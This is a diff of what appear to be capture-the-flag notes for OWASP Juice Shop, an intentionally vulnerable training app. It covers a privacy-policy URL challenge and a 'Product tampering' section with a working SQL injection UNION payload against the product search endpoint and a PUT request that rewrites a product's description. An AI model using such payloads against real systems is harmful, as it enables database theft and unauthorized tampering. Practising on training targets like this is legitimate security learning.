@@ -204,19 +204,20 @@ POST /api/BasketItems/ HTTP/1.1<br>
 check out<br>
 
 ### Privacy Policy Inspection 
-firefox > highlighted glowing text > inspect 
-span class="hot"
-search .hot
-http://localhost we may also instruct you to refuse all reasonably necessary responsibility
-http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
+firefox > highlighted glowing text > inspect <br>
+span class="hot"<br>
+search .hot<br>
+http://localhost we may also instruct you to refuse all reasonably necessary responsibility<br>
+http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility<br>
 
 ### Product tampering
-burp suite > repeater
-GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1
-PUT /api/products/9 HTTP/1.1
-Content-Type: application/json
-{"description":"<a href=\"https://owasp.slack.com\""}
+burp suite > repeater<br>
+GET /rest/products/search?q=apple'))union%20select%20id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt%20from%20Products-- HTTP/1.1<br>
+PUT /api/products/9 HTTP/1.1<br>
+Content-Type: application/json<br>
+{"description":"<a href=\"https://owasp.slack.com\""}<br>
 
+###
 
 
 
